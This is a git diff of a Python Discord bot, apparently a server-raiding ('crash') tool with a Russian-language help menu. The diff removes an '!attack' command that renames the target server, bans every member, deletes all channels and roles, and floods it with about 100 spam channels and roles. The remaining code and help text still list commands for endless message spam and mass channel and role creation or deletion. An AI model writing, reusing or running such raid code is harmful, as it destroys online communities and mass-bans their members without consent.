@@ -15,39 +15,6 @@ async def s(ctx, *, text):
     await ctx.message.delete()
     await ctx.send(embed = discord.Embed(description = text))
 
-
-@client.command()
-async def attack(ctx):
-    await ctx.guild.edit(name = 'Crashed By Blood Group')
-    await ctx.message.delete()
-
-    for member in ctx.guild.members:
-        try:
-            await member.ban()
-        except:
-            continue
-
-    for channel in ctx.guild.channels:
-        await channel.delete()
-    roles = ctx.guild.roles
-    roles.pop(0)
-
-    for role in roles:
-        if ctx.guild.me.roles[-1] > role:
-            try:
-                await role.delete()
-            except:
-                continue
-
-    for i in range(1,100):
-        await ctx.guild.create_text_channel('crashed by blood group')
-    for i in range(1,100):
-        await ctx.guild.create_voice_channel('Crashed By Blood Group')
-    for i in range(1,100):
-        await ctx.guild.create_role(name = 'Blood Attack')
-        role = discord.utils.get(ctx.guild.roles, name = "Blood Attack")
-
-        
 @client.command()
 async def spam(ctx):
     while True:
@@ -86,7 +53,7 @@ async def roles(ctx):
 async def help(ctx):
     embed = discord.Embed(
         title = 'Команды',
-        description = '''**Спам команды**\n!s - сказать что нибудь от лица бота.\n!spam - начать массовый спам.\n**Краш команды**\n!attack - авто краш сервера.\n!channels - спам каналами.\n!channel - удалить каналы.\n!roles - спам ролями.\n!role - удалить роли.\n**Информация**\n!info - информация о юзере.\n[**🔗Support Server**](https://discord.gg/rEqrEpF8xA)\n[Made wotch by GitHub: https://github.com/Biohazard-python](https://github.com/Biohazard-python)''',
+        description = '''**Спам команды**\n!s - сказать что нибудь от лица бота.\n!spam - начать массовый спам.\n**Краш команды**\n!channels - спам каналами.\n!channel - удалить каналы.\n!roles - спам ролями.\n!role - удалить роли.\n**Информация**\n!info - информация о юзере.\n[**🔗Support Server**](https://discord.gg/rEqrEpF8xA)\n[Made wotch by GitHub: https://github.com/Biohazard-python](https://github.com/Biohazard-python)''',
     )
     embed.set_image(url='https://cdn.discordapp.com/attachments/820182533861408799/823601330492538880/180px-D092D181D0B5D180D0BED181D181D0B8D0B9D181D0BAD0B0D18F_D184D0B0D188D0B8D181D182D181D0BAD0B0D18F_.png') #image for embed
     await ctx.send(embed=embed)
